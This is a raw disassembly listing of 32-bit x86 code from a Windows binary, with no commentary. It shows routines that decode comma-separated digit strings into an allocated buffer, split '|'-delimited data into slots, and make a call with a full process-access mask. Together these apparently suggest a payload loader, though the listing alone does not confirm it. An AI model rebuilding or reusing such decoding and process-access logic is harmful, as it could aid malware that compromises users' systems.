  403ede:	e8 2d 0e 00 00       	call   0x404d10
  403ee3:	6a 05                	push   $0x5
  403ee5:	8b f8                	mov    %eax,%edi
  403ee7:	e8 44 dc ff ff       	call   0x401b30
  403eec:	50                   	push   %eax
  403eed:	68 60 d0 40 00       	push   $0x40d060
  403ef2:	e8 df 29 00 00       	call   0x4068d6
  403ef7:	8b 0d 5c cc 40 00    	mov    0x40cc5c,%ecx
  403efd:	51                   	push   %ecx
  403efe:	68 60 d0 40 00       	push   $0x40d060
  403f03:	e8 05 2a 00 00       	call   0x40690d
  403f08:	68 60 d0 40 00       	push   $0x40d060
  403f0d:	c7 45 fc 60 d0 40 00 	movl   $0x40d060,-0x4(%ebp)
  403f14:	e8 d0 29 00 00       	call   0x4068e9
  403f19:	68 60 d0 40 00       	push   $0x40d060
  403f1e:	66 89 45 fa          	mov    %ax,-0x6(%ebp)
  403f22:	e8 c2 29 00 00       	call   0x4068e9
  403f27:	83 c4 18             	add    $0x18,%esp
  403f2a:	66 89 45 f8          	mov    %ax,-0x8(%ebp)
  403f2e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403f31:	68 60 d2 40 00       	push   $0x40d260
  403f36:	50                   	push   %eax
  403f37:	e8 64 05 00 00       	call   0x4044a0
  403f3c:	a1 5c cc 40 00       	mov    0x40cc5c,%eax
  403f41:	50                   	push   %eax
  403f42:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403f45:	e8 9f 29 00 00       	call   0x4068e9
  403f4a:	66 89 45 fa          	mov    %ax,-0x6(%ebp)
  403f4e:	a1 5c cc 40 00       	mov    0x40cc5c,%eax
  403f53:	50                   	push   %eax
  403f54:	e8 90 29 00 00       	call   0x4068e9
  403f59:	83 c4 08             	add    $0x8,%esp
  403f5c:	66 89 45 f8          	mov    %ax,-0x8(%ebp)
  403f60:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403f63:	68 60 cc 40 00       	push   $0x40cc60
  403f68:	50                   	push   %eax
  403f69:	e8 32 05 00 00       	call   0x4044a0
  403f6e:	8d 47 01             	lea    0x1(%edi),%eax
  403f71:	a3 54 cc 40 00       	mov    %eax,0x40cc54
  403f76:	8a 07                	mov    (%edi),%al
  403f78:	3c 7d                	cmp    $0x7d,%al
  403f7a:	74 1a                	je     0x403f96
  403f7c:	8d 64 24 00          	lea    0x0(%esp),%esp
  403f80:	84 c0                	test   %al,%al
  403f82:	74 12                	je     0x403f96
  403f84:	3c 2c                	cmp    $0x2c,%al
  403f86:	75 06                	jne    0x403f8e
  403f88:	ff 05 58 cc 40 00    	incl   0x40cc58
  403f8e:	8a 47 01             	mov    0x1(%edi),%al
  403f91:	47                   	inc    %edi
  403f92:	3c 7d                	cmp    $0x7d,%al
  403f94:	75 ea                	jne    0x403f80
  403f96:	a1 58 cc 40 00       	mov    0x40cc58,%eax
  403f9b:	85 c0                	test   %eax,%eax
  403f9d:	74 06                	je     0x403fa5
  403f9f:	40                   	inc    %eax
  403fa0:	a3 58 cc 40 00       	mov    %eax,0x40cc58
  403fa5:	8b 3d 54 cc 40 00    	mov    0x40cc54,%edi
  403fab:	68 51 61 78 58       	push   $0x58786151
  403fb0:	50                   	push   %eax
  403fb1:	6a 01                	push   $0x1
  403fb3:	ff 15 f4 70 40 00    	call   *0x4070f4
  403fb9:	a3 54 cc 40 00       	mov    %eax,0x40cc54
  403fbe:	85 c0                	test   %eax,%eax
  403fc0:	75 36                	jne    0x403ff8
  403fc2:	a1 50 cc 40 00       	mov    0x40cc50,%eax
  403fc7:	b9 00 00 02 00       	mov    $0x20000,%ecx
  403fcc:	89 35 5c cc 40 00    	mov    %esi,0x40cc5c
  403fd2:	c6 00 00             	movb   $0x0,(%eax)
  403fd5:	8d 40 01             	lea    0x1(%eax),%eax
  403fd8:	83 e9 01             	sub    $0x1,%ecx
  403fdb:	75 f5                	jne    0x403fd2
  403fdd:	b9 04 00 00 00       	mov    $0x4,%ecx
  403fe2:	b8 60 d0 40 00       	mov    $0x40d060,%eax
  403fe7:	c6 00 00             	movb   $0x0,(%eax)
  403fea:	40                   	inc    %eax
  403feb:	83 e9 01             	sub    $0x1,%ecx
  403fee:	75 f7                	jne    0x403fe7
  403ff0:	5f                   	pop    %edi
  403ff1:	32 c0                	xor    %al,%al
  403ff3:	5e                   	pop    %esi
  403ff4:	8b e5                	mov    %ebp,%esp
  403ff6:	5d                   	pop    %ebp
  403ff7:	c3                   	ret
  403ff8:	8b 0d 58 cc 40 00    	mov    0x40cc58,%ecx
  403ffe:	85 c9                	test   %ecx,%ecx
  404000:	74 0b                	je     0x40400d
  404002:	c6 00 00             	movb   $0x0,(%eax)
  404005:	8d 40 01             	lea    0x1(%eax),%eax
  404008:	83 e9 01             	sub    $0x1,%ecx
  40400b:	75 f5                	jne    0x404002
  40400d:	53                   	push   %ebx
  40400e:	8a 1f                	mov    (%edi),%bl
  404010:	80 fb 7d             	cmp    $0x7d,%bl
  404013:	74 37                	je     0x40404c
  404015:	84 db                	test   %bl,%bl
  404017:	74 33                	je     0x40404c
  404019:	81 fe 00 00 02 00    	cmp    $0x20000,%esi
  40401f:	73 2b                	jae    0x40404c
  404021:	80 fb 2c             	cmp    $0x2c,%bl
  404024:	74 1c                	je     0x404042
  404026:	8b 15 54 cc 40 00    	mov    0x40cc54,%edx
  40402c:	8a 04 32             	mov    (%edx,%esi,1),%al
  40402f:	8a c8                	mov    %al,%cl
  404031:	c0 e0 02             	shl    $0x2,%al
  404034:	02 c8                	add    %al,%cl
  404036:	02 c9                	add    %cl,%cl
  404038:	80 e9 30             	sub    $0x30,%cl
  40403b:	02 cb                	add    %bl,%cl
  40403d:	88 0c 32             	mov    %cl,(%edx,%esi,1)
  404040:	eb 01                	jmp    0x404043
  404042:	46                   	inc    %esi
  404043:	8a 5f 01             	mov    0x1(%edi),%bl
  404046:	47                   	inc    %edi
  404047:	80 fb 7d             	cmp    $0x7d,%bl
  40404a:	75 c9                	jne    0x404015
  40404c:	5b                   	pop    %ebx
  40404d:	5f                   	pop    %edi
  40404e:	b0 01                	mov    $0x1,%al
  404050:	5e                   	pop    %esi
  404051:	8b e5                	mov    %ebp,%esp
  404053:	5d                   	pop    %ebp
  404054:	c3                   	ret
  404055:	cc                   	int3
  404056:	cc                   	int3
  404057:	cc                   	int3
  404058:	cc                   	int3
  404059:	cc                   	int3
  40405a:	cc                   	int3
  40405b:	cc                   	int3
  40405c:	cc                   	int3
  40405d:	cc                   	int3
  40405e:	cc                   	int3
  40405f:	cc                   	int3
  404060:	56                   	push   %esi
  404061:	33 f6                	xor    %esi,%esi
  404063:	39 35 80 e8 40 00    	cmp    %esi,0x40e880
  404069:	0f 84 b4 00 00 00    	je     0x404123
  40406f:	b9 00 08 00 00       	mov    $0x800,%ecx
  404074:	b8 60 d6 40 00       	mov    $0x40d660,%eax
  404079:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404080:	c6 00 00             	movb   $0x0,(%eax)
  404083:	8d 40 01             	lea    0x1(%eax),%eax
  404086:	83 e9 01             	sub    $0x1,%ecx
  404089:	75 f5                	jne    0x404080
  40408b:	ba 80 de 40 00       	mov    $0x40de80,%edx
  404090:	b9 00 02 00 00       	mov    $0x200,%ecx
  404095:	8b c2                	mov    %edx,%eax
  404097:	c6 00 00             	movb   $0x0,(%eax)
  40409a:	8d 40 01             	lea    0x1(%eax),%eax
  40409d:	83 e9 01             	sub    $0x1,%ecx
  4040a0:	75 f5                	jne    0x404097
  4040a2:	81 c2 00 02 00 00    	add    $0x200,%edx
  4040a8:	81 fa 80 e8 40 00    	cmp    $0x40e880,%edx
  4040ae:	7c e0                	jl     0x404090
  4040b0:	a1 80 e8 40 00       	mov    0x40e880,%eax
  4040b5:	51                   	push   %ecx
  4040b6:	68 00 08 00 00       	push   $0x800
  4040bb:	68 60 d6 40 00       	push   $0x40d660
  4040c0:	50                   	push   %eax
  4040c1:	e8 5a 1a 00 00       	call   0x405b20
  4040c6:	84 c0                	test   %al,%al
  4040c8:	74 59                	je     0x404123
  4040ca:	6a 03                	push   $0x3
  4040cc:	e8 5f da ff ff       	call   0x401b30
  4040d1:	6a 1e                	push   $0x1e
  4040d3:	50                   	push   %eax
  4040d4:	68 60 d6 40 00       	push   $0x40d660
  4040d9:	e8 32 0c 00 00       	call   0x404d10
  4040de:	85 c0                	test   %eax,%eax
  4040e0:	74 41                	je     0x404123
  4040e2:	6a 00                	push   $0x0
  4040e4:	68 00 08 00 00       	push   $0x800
  4040e9:	68 60 d6 40 00       	push   $0x40d660
  4040ee:	e8 2d 17 00 00       	call   0x405820
  4040f3:	85 c0                	test   %eax,%eax
  4040f5:	74 2c                	je     0x404123
  4040f7:	8a 08                	mov    (%eax),%cl
  4040f9:	84 c9                	test   %cl,%cl
  4040fb:	74 22                	je     0x40411f
  4040fd:	33 d2                	xor    %edx,%edx
  4040ff:	90                   	nop
  404100:	80 f9 7c             	cmp    $0x7c,%cl
  404103:	75 0a                	jne    0x40410f
  404105:	81 c2 00 02 00 00    	add    $0x200,%edx
  40410b:	33 f6                	xor    %esi,%esi
  40410d:	eb 08                	jmp    0x404117
  40410f:	88 8c 32 80 de 40 00 	mov    %cl,0x40de80(%edx,%esi,1)
  404116:	46                   	inc    %esi
  404117:	8a 48 01             	mov    0x1(%eax),%cl
  40411a:	40                   	inc    %eax
  40411b:	84 c9                	test   %cl,%cl
  40411d:	75 e1                	jne    0x404100
  40411f:	b0 01                	mov    $0x1,%al
  404121:	5e                   	pop    %esi
  404122:	c3                   	ret
  404123:	32 c0                	xor    %al,%al
  404125:	5e                   	pop    %esi
  404126:	c3                   	ret
  404127:	cc                   	int3
  404128:	cc                   	int3
  404129:	cc                   	int3
  40412a:	cc                   	int3
  40412b:	cc                   	int3
  40412c:	cc                   	int3
  40412d:	cc                   	int3
  40412e:	cc                   	int3
  40412f:	cc                   	int3
  404130:	55                   	push   %ebp
  404131:	8b ec                	mov    %esp,%ebp
  404133:	81 ec 04 01 00 00    	sub    $0x104,%esp
  404139:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  40413e:	33 c5                	xor    %ebp,%eax
  404140:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404143:	68 00 01 00 00       	push   $0x100
  404148:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  40414e:	6a 00                	push   $0x0
  404150:	50                   	push   %eax
  404151:	e8 7a 27 00 00       	call   0x4068d0
  404156:	83 c4 0c             	add    $0xc,%esp
  404159:	83 3d 80 e8 40 00 00 	cmpl   $0x0,0x40e880
  404160:	0f 84 c6 00 00 00    	je     0x40422c
  404166:	80 3d 80 e2 40 00 00 	cmpb   $0x0,0x40e280
  40416d:	0f 84 b9 00 00 00    	je     0x40422c
  404173:	68 60 de 40 00       	push   $0x40de60
  404178:	68 80 e2 40 00       	push   $0x40e280
  40417d:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  404183:	68 8c 6d 40 00       	push   $0x406d8c
  404188:	50                   	push   %eax
  404189:	e8 55 27 00 00       	call   0x4068e3
  40418e:	83 c4 10             	add    $0x10,%esp
  404191:	b9 00 08 00 00       	mov    $0x800,%ecx
  404196:	b8 60 d6 40 00       	mov    $0x40d660,%eax
  40419b:	eb 03                	jmp    0x4041a0
  40419d:	8d 49 00             	lea    0x0(%ecx),%ecx
  4041a0:	c6 00 00             	movb   $0x0,(%eax)
  4041a3:	8d 40 01             	lea    0x1(%eax),%eax
  4041a6:	83 e9 01             	sub    $0x1,%ecx
  4041a9:	75 f5                	jne    0x4041a0
  4041ab:	51                   	push   %ecx
  4041ac:	68 00 08 00 00       	push   $0x800
  4041b1:	68 60 d6 40 00       	push   $0x40d660
  4041b6:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  4041bc:	50                   	push   %eax
  4041bd:	e8 5e 19 00 00       	call   0x405b20
  4041c2:	84 c0                	test   %al,%al
  4041c4:	74 66                	je     0x40422c
  4041c6:	6a 03                	push   $0x3
  4041c8:	e8 63 d9 ff ff       	call   0x401b30
  4041cd:	6a 1e                	push   $0x1e
  4041cf:	50                   	push   %eax
  4041d0:	68 60 d6 40 00       	push   $0x40d660
  4041d5:	e8 36 0b 00 00       	call   0x404d10
  4041da:	85 c0                	test   %eax,%eax
  4041dc:	74 4e                	je     0x40422c
  4041de:	6a 00                	push   $0x0
  4041e0:	68 00 08 00 00       	push   $0x800
  4041e5:	68 60 d6 40 00       	push   $0x40d660
  4041ea:	e8 31 16 00 00       	call   0x405820
  4041ef:	85 c0                	test   %eax,%eax
  4041f1:	74 39                	je     0x40422c
  4041f3:	68 00 08 00 00       	push   $0x800
  4041f8:	68 94 6d 40 00       	push   $0x406d94
  4041fd:	50                   	push   %eax
  4041fe:	e8 0d 0b 00 00       	call   0x404d10
  404203:	85 c0                	test   %eax,%eax
  404205:	74 25                	je     0x40422c
  404207:	b9 00 08 00 00       	mov    $0x800,%ecx
  40420c:	b8 60 d6 40 00       	mov    $0x40d660,%eax
  404211:	c6 00 00             	movb   $0x0,(%eax)
  404214:	8d 40 01             	lea    0x1(%eax),%eax
  404217:	83 e9 01             	sub    $0x1,%ecx
  40421a:	75 f5                	jne    0x404211
  40421c:	b0 01                	mov    $0x1,%al
  40421e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404221:	33 cd                	xor    %ebp,%ecx
  404223:	e8 4e 2a 00 00       	call   0x406c76
  404228:	8b e5                	mov    %ebp,%esp
  40422a:	5d                   	pop    %ebp
  40422b:	c3                   	ret
  40422c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40422f:	32 c0                	xor    %al,%al
  404231:	33 cd                	xor    %ebp,%ecx
  404233:	e8 3e 2a 00 00       	call   0x406c76
  404238:	8b e5                	mov    %ebp,%esp
  40423a:	5d                   	pop    %ebp
  40423b:	c3                   	ret
  40423c:	cc                   	int3
  40423d:	cc                   	int3
  40423e:	cc                   	int3
  40423f:	cc                   	int3
  404240:	55                   	push   %ebp
  404241:	8b ec                	mov    %esp,%ebp
  404243:	81 ec 10 02 00 00    	sub    $0x210,%esp
  404249:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  40424e:	33 c5                	xor    %ebp,%eax
  404250:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404253:	53                   	push   %ebx
  404254:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404257:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40425d:	56                   	push   %esi
  40425e:	57                   	push   %edi
  40425f:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404262:	68 00 02 00 00       	push   $0x200
  404267:	6a 00                	push   $0x0
  404269:	50                   	push   %eax
  40426a:	e8 61 26 00 00       	call   0x4068d0
  40426f:	33 c0                	xor    %eax,%eax
  404271:	83 c4 0c             	add    $0xc,%esp
  404274:	89 85 f0 fd ff ff    	mov    %eax,-0x210(%ebp)
  40427a:	89 85 f4 fd ff ff    	mov    %eax,-0x20c(%ebp)
  404280:	89 85 f8 fd ff ff    	mov    %eax,-0x208(%ebp)
  404286:	38 07                	cmp    %al,(%edi)
  404288:	0f 84 5c 01 00 00    	je     0x4043ea
  40428e:	39 05 80 e8 40 00    	cmp    %eax,0x40e880
  404294:	0f 84 50 01 00 00    	je     0x4043ea
  40429a:	38 05 80 e6 40 00    	cmp    %al,0x40e680
  4042a0:	0f 84 44 01 00 00    	je     0x4043ea
  4042a6:	68 00 02 00 00       	push   $0x200
  4042ab:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  4042b1:	68 80 e6 40 00       	push   $0x40e680
  4042b6:	50                   	push   %eax
  4042b7:	e8 39 26 00 00       	call   0x4068f5
  4042bc:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  4042c2:	50                   	push   %eax
  4042c3:	e8 21 26 00 00       	call   0x4068e9
  4042c8:	be 00 02 00 00       	mov    $0x200,%esi
  4042cd:	8b ce                	mov    %esi,%ecx
  4042cf:	2b c8                	sub    %eax,%ecx
  4042d1:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  4042d7:	51                   	push   %ecx
  4042d8:	68 b2 6d 40 00       	push   $0x406db2
  4042dd:	50                   	push   %eax
  4042de:	e8 36 26 00 00       	call   0x406919
  4042e3:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  4042e9:	50                   	push   %eax
  4042ea:	e8 fa 25 00 00       	call   0x4068e9
  4042ef:	8b ce                	mov    %esi,%ecx
  4042f1:	2b c8                	sub    %eax,%ecx
  4042f3:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  4042f9:	51                   	push   %ecx
  4042fa:	ff 35 84 a7 40 00    	push   0x40a784
  404300:	50                   	push   %eax
  404301:	e8 13 26 00 00       	call   0x406919
  404306:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40430c:	50                   	push   %eax
  40430d:	e8 d7 25 00 00       	call   0x4068e9
  404312:	8b ce                	mov    %esi,%ecx
  404314:	2b c8                	sub    %eax,%ecx
  404316:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40431c:	51                   	push   %ecx
  40431d:	68 b6 6d 40 00       	push   $0x406db6
  404322:	50                   	push   %eax
  404323:	e8 f1 25 00 00       	call   0x406919
  404328:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40432e:	50                   	push   %eax
  40432f:	e8 b5 25 00 00       	call   0x4068e9
  404334:	83 c4 40             	add    $0x40,%esp
  404337:	2b f0                	sub    %eax,%esi
  404339:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40433f:	56                   	push   %esi
  404340:	57                   	push   %edi
  404341:	50                   	push   %eax
  404342:	e8 d2 25 00 00       	call   0x406919
  404347:	83 c4 0c             	add    $0xc,%esp
  40434a:	8d 8d f0 fd ff ff    	lea    -0x210(%ebp),%ecx
  404350:	68 00 08 00 00       	push   $0x800
  404355:	e8 86 24 00 00       	call   0x4067e0
  40435a:	84 c0                	test   %al,%al
  40435c:	0f 84 88 00 00 00    	je     0x4043ea
  404362:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  404368:	50                   	push   %eax
  404369:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  40436f:	50                   	push   %eax
  404370:	e8 1b 15 00 00       	call   0x405890
  404375:	84 c0                	test   %al,%al
  404377:	74 71                	je     0x4043ea
  404379:	6a 03                	push   $0x3
  40437b:	e8 b0 d7 ff ff       	call   0x401b30
  404380:	50                   	push   %eax
  404381:	8d 8d f0 fd ff ff    	lea    -0x210(%ebp),%ecx
  404387:	e8 d4 24 00 00       	call   0x406860
  40438c:	6a 00                	push   $0x0
  40438e:	50                   	push   %eax
  40438f:	8d 8d f0 fd ff ff    	lea    -0x210(%ebp),%ecx
  404395:	e8 e6 23 00 00       	call   0x406780
  40439a:	50                   	push   %eax
  40439b:	e8 00 f4 ff ff       	call   0x4037a0
  4043a0:	84 c0                	test   %al,%al
  4043a2:	74 46                	je     0x4043ea
  4043a4:	8d 8d f0 fd ff ff    	lea    -0x210(%ebp),%ecx
  4043aa:	e8 b1 24 00 00       	call   0x406860
  4043af:	6a 00                	push   $0x0
  4043b1:	50                   	push   %eax
  4043b2:	8d 8d f0 fd ff ff    	lea    -0x210(%ebp),%ecx
  4043b8:	e8 c3 23 00 00       	call   0x406780
  4043bd:	50                   	push   %eax
  4043be:	e8 5d 14 00 00       	call   0x405820
  4043c3:	8b f0                	mov    %eax,%esi
  4043c5:	85 f6                	test   %esi,%esi
  4043c7:	74 21                	je     0x4043ea
  4043c9:	68 ba 6d 40 00       	push   $0x406dba
  4043ce:	56                   	push   %esi
  4043cf:	e8 4b 25 00 00       	call   0x40691f
  4043d4:	83 c4 08             	add    $0x8,%esp
  4043d7:	85 c0                	test   %eax,%eax
  4043d9:	74 31                	je     0x40440c
  4043db:	68 ff 00 00 00       	push   $0xff
  4043e0:	56                   	push   %esi
  4043e1:	53                   	push   %ebx
  4043e2:	e8 0e 25 00 00       	call   0x4068f5
  4043e7:	83 c4 0c             	add    $0xc,%esp
  4043ea:	32 db                	xor    %bl,%bl
  4043ec:	8d 8d f0 fd ff ff    	lea    -0x210(%ebp),%ecx
  4043f2:	e8 b9 23 00 00       	call   0x4067b0
  4043f7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4043fa:	8a c3                	mov    %bl,%al
  4043fc:	5f                   	pop    %edi
  4043fd:	5e                   	pop    %esi
  4043fe:	33 cd                	xor    %ebp,%ecx
  404400:	5b                   	pop    %ebx
  404401:	e8 70 28 00 00       	call   0x406c76
  404406:	8b e5                	mov    %ebp,%esp
  404408:	5d                   	pop    %ebp
  404409:	c2 08 00             	ret    $0x8
  40440c:	b3 01                	mov    $0x1,%bl
  40440e:	eb dc                	jmp    0x4043ec
  404410:	55                   	push   %ebp
  404411:	8b ec                	mov    %esp,%ebp
  404413:	51                   	push   %ecx
  404414:	80 3d 60 d0 40 00 00 	cmpb   $0x0,0x40d060
  40441b:	53                   	push   %ebx
  40441c:	74 6f                	je     0x40448d
  40441e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404421:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  404428:	50                   	push   %eax
  404429:	68 a8 6d 40 00       	push   $0x406da8
  40442e:	68 60 d2 40 00       	push   $0x40d260
  404433:	32 db                	xor    %bl,%bl
  404435:	e8 f6 06 00 00       	call   0x404b30
  40443a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40443d:	85 c0                	test   %eax,%eax
  40443f:	78 13                	js     0x404454
  404441:	85 c9                	test   %ecx,%ecx
  404443:	74 20                	je     0x404465
  404445:	8d 41 0c             	lea    0xc(%ecx),%eax
  404448:	85 c0                	test   %eax,%eax
  40444a:	74 08                	je     0x404454
  40444c:	83 79 08 00          	cmpl   $0x0,0x8(%ecx)
  404450:	74 02                	je     0x404454
  404452:	b3 01                	mov    $0x1,%bl
  404454:	85 c9                	test   %ecx,%ecx
  404456:	74 09                	je     0x404461
  404458:	6a 00                	push   $0x0
  40445a:	51                   	push   %ecx
  40445b:	ff 15 ac 71 40 00    	call   *0x4071ac
  404461:	84 db                	test   %bl,%bl
  404463:	75 21                	jne    0x404486
  404465:	a1 58 cc 40 00       	mov    0x40cc58,%eax
  40446a:	50                   	push   %eax
  40446b:	a1 54 cc 40 00       	mov    0x40cc54,%eax
  404470:	50                   	push   %eax
  404471:	6a 03                	push   $0x3
  404473:	68 a8 6d 40 00       	push   $0x406da8
  404478:	68 60 d2 40 00       	push   $0x40d260
  40447d:	e8 ce 07 00 00       	call   0x404c50
  404482:	85 c0                	test   %eax,%eax
  404484:	74 07                	je     0x40448d
  404486:	b0 01                	mov    $0x1,%al
  404488:	5b                   	pop    %ebx
  404489:	8b e5                	mov    %ebp,%esp
  40448b:	5d                   	pop    %ebp
  40448c:	c3                   	ret
  40448d:	32 c0                	xor    %al,%al
  40448f:	5b                   	pop    %ebx
  404490:	8b e5                	mov    %ebp,%esp
  404492:	5d                   	pop    %ebp
  404493:	c3                   	ret
  404494:	cc                   	int3
  404495:	cc                   	int3
  404496:	cc                   	int3
  404497:	cc                   	int3
  404498:	cc                   	int3
  404499:	cc                   	int3
  40449a:	cc                   	int3
  40449b:	cc                   	int3
  40449c:	cc                   	int3
  40449d:	cc                   	int3
  40449e:	cc                   	int3
  40449f:	cc                   	int3
  4044a0:	55                   	push   %ebp
  4044a1:	8b ec                	mov    %esp,%ebp
  4044a3:	83 ec 08             	sub    $0x8,%esp
  4044a6:	6a 01                	push   $0x1
  4044a8:	ff 75 08             	push   0x8(%ebp)
  4044ab:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4044ae:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4044b5:	50                   	push   %eax
  4044b6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4044bd:	ff 15 04 71 40 00    	call   *0x407104
  4044c3:	85 c0                	test   %eax,%eax
  4044c5:	78 1d                	js     0x4044e4
  4044c7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4044ca:	85 c0                	test   %eax,%eax
  4044cc:	74 16                	je     0x4044e4
  4044ce:	50                   	push   %eax
  4044cf:	ff 75 0c             	push   0xc(%ebp)
  4044d2:	e8 4e 24 00 00       	call   0x406925
  4044d7:	83 c4 08             	add    $0x8,%esp
  4044da:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4044dd:	50                   	push   %eax
  4044de:	ff 15 08 71 40 00    	call   *0x407108
  4044e4:	8b e5                	mov    %ebp,%esp
  4044e6:	5d                   	pop    %ebp
  4044e7:	c2 08 00             	ret    $0x8
  4044ea:	cc                   	int3
  4044eb:	cc                   	int3
  4044ec:	cc                   	int3
  4044ed:	cc                   	int3
  4044ee:	cc                   	int3
  4044ef:	cc                   	int3
  4044f0:	55                   	push   %ebp
  4044f1:	8b ec                	mov    %esp,%ebp
  4044f3:	6a 00                	push   $0x0
  4044f5:	ff 75 0c             	push   0xc(%ebp)
  4044f8:	6a 00                	push   $0x0
  4044fa:	6a 00                	push   $0x0
  4044fc:	6a 00                	push   $0x0
  4044fe:	68 ff ff 1f 00       	push   $0x1fffff
  404503:	ff 75 08             	push   0x8(%ebp)
  404506:	ff 15 20 71 40 00    	call   *0x407120
  40450c:	85 c0                	test   %eax,%eax
  40450e:	0f 99 c0             	setns  %al
  404511:	5d                   	pop    %ebp
  404512:	c2 08 00             	ret    $0x8
  404515:	cc                   	int3
  404516:	cc                   	int3
  404517:	cc                   	int3
  404518:	cc                   	int3
  404519:	cc                   	int3
  40451a:	cc                   	int3
  40451b:	cc                   	int3
  40451c:	cc                   	int3
  40451d:	cc                   	int3
  40451e:	cc                   	int3
  40451f:	cc                   	int3
  404520:	55                   	push   %ebp
  404521:	8b ec                	mov    %esp,%ebp
  404523:	8b 45 08             	mov    0x8(%ebp),%eax
  404526:	53                   	push   %ebx
  404527:	56                   	push   %esi
  404528:	57                   	push   %edi
  404529:	85 c0                	test   %eax,%eax
  40452b:	74 5b                	je     0x404588
  40452d:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404530:	85 c9                	test   %ecx,%ecx
  404532:	74 54                	je     0x404588
  404534:	66 83 39 00          	cmpw   $0x0,(%ecx)
  404538:	74 4e                	je     0x404588
  40453a:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40453d:	85 db                	test   %ebx,%ebx
  40453f:	7e 47                	jle    0x404588
  404541:	8b f0                	mov    %eax,%esi
  404543:	2b f1                	sub    %ecx,%esi
  404545:	66 83 38 00          	cmpw   $0x0,(%eax)
  404549:	74 3d                	je     0x404588
  40454b:	8b c1                	mov    %ecx,%eax
  40454d:	8b fb                	mov    %ebx,%edi
  40454f:	90                   	nop
  404550:	0f b7 08             	movzwl (%eax),%ecx
  404553:	66 85 c9             	test   %cx,%cx
  404556:	74 39                	je     0x404591
  404558:	0f b7 14 06          	movzwl (%esi,%eax,1),%edx
  40455c:	2b d1                	sub    %ecx,%edx
  40455e:	75 0e                	jne    0x40456e
  404560:	83 c0 02             	add    $0x2,%eax
  404563:	83 ef 01             	sub    $0x1,%edi
  404566:	78 20                	js     0x404588
  404568:	66 39 14 06          	cmp    %dx,(%esi,%eax,1)
  40456c:	75 e2                	jne    0x404550
  40456e:	66 83 38 00          	cmpw   $0x0,(%eax)
  404572:	74 1d                	je     0x404591
  404574:	8b 45 08             	mov    0x8(%ebp),%eax
  404577:	4b                   	dec    %ebx
  404578:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40457b:	83 c0 02             	add    $0x2,%eax
  40457e:	83 c6 02             	add    $0x2,%esi
  404581:	89 45 08             	mov    %eax,0x8(%ebp)
  404584:	85 db                	test   %ebx,%ebx
  404586:	7f bd                	jg     0x404545
  404588:	5f                   	pop    %edi
  404589:	5e                   	pop    %esi
  40458a:	33 c0                	xor    %eax,%eax
  40458c:	5b                   	pop    %ebx
  40458d:	5d                   	pop    %ebp
  40458e:	c2 0c 00             	ret    $0xc
  404591:	8b 45 08             	mov    0x8(%ebp),%eax
  404594:	5f                   	pop    %edi
  404595:	5e                   	pop    %esi
  404596:	5b                   	pop    %ebx
  404597:	5d                   	pop    %ebp
  404598:	c2 0c 00             	ret    $0xc
  40459b:	cc                   	int3
  40459c:	cc                   	int3
  40459d:	cc                   	int3
  40459e:	cc                   	int3
  40459f:	cc                   	int3
  4045a0:	55                   	push   %ebp
  4045a1:	8b ec                	mov    %esp,%ebp
  4045a3:	83 ec 18             	sub    $0x18,%esp
  4045a6:	8a 4d 0c             	mov    0xc(%ebp),%cl
  4045a9:	33 c0                	xor    %eax,%eax
  4045ab:	53                   	push   %ebx
  4045ac:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4045af:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4045b2:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4045b5:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4045b8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4045bb:	a1 6c 71 40 00       	mov    0x40716c,%eax
  4045c0:	0f b6 d9             	movzbl %cl,%ebx
  4045c3:	f7 db                	neg    %ebx
  4045c5:	56                   	push   %esi
  4045c6:	8b 00                	mov    (%eax),%eax
  4045c8:	1b db                	sbb    %ebx,%ebx
  4045ca:	57                   	push   %edi
  4045cb:	81 e3 00 00 02 70    	and    $0x70020000,%ebx
  4045d1:	81 c3 00 00 00 10    	add    $0x10000000,%ebx
  4045d7:	8b 80 e0 00 00 00    	mov    0xe0(%eax),%eax
  4045dd:	50                   	push   %eax
  4045de:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4045e1:	ff 15 3c 71 40 00    	call   *0x40713c
